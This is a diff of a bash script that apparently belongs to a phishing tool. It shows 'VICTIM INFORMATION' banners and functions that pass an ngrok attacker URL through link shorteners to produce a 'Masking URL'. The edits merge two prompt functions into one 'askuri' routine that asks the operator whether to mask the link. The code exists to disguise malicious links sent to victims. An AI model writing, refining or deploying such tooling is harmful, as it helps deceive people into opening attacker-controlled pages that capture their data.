@@ -63,7 +63,7 @@ logo_last
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
-askuri_c
+askuri
 clear
 logo_last
 sleep 3
@@ -89,7 +89,7 @@ logo_last
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
-askuri_n
+askuri
 clear
 logo_last
 sleep 3
@@ -106,6 +106,7 @@ clear
 exit
 fi
 }
+
 function url_checker() {
         if [ ! "${1//:*}" = http ]; then
 	        if [ ! "${1//:*}" = https ]; then
@@ -115,8 +116,9 @@ function url_checker() {
 		fi
 	fi
 }
+
 # URL_SHORTNER
-function url_shortner_c() {
+url_shortner_c() {
         rm -rf uri.log log.URI 
 	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
 	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
@@ -149,7 +151,8 @@ echo -e " \e[91m[\e[92m★\e[91m] \e[93mYour Masking URL/Link:\e[32m ${final_url
 echo -e ""
 echo -e ""
 }
-function url_shortner_n() {
+
+url_shortner_n() {
         rm -rf uri.log log.URI 
 	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
 	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
@@ -181,6 +184,39 @@ echo -en "\e[32m=>\e[0m "
 echo -e " \e[91m[\e[92m★\e[91m] \e[93mYour Masking URL/Link:\e[32m ${final_url} \e[0m\n"
 echo -e ""
 echo -e ""
+}
+
+# ASK FOR URL MODIFICATION
+function askuri() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == *'Y'* ]]; then
+url_shortner_c
+
+fi
+if [[ $option == *'y'* ]]; then
+url_shortner_c
+
+fi
+
+if [[ $option == *'n'* ]]; then
+clear
+echo""
+echo""
+
+fi
+if [[ $option == *'N'* ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
 }
 
 
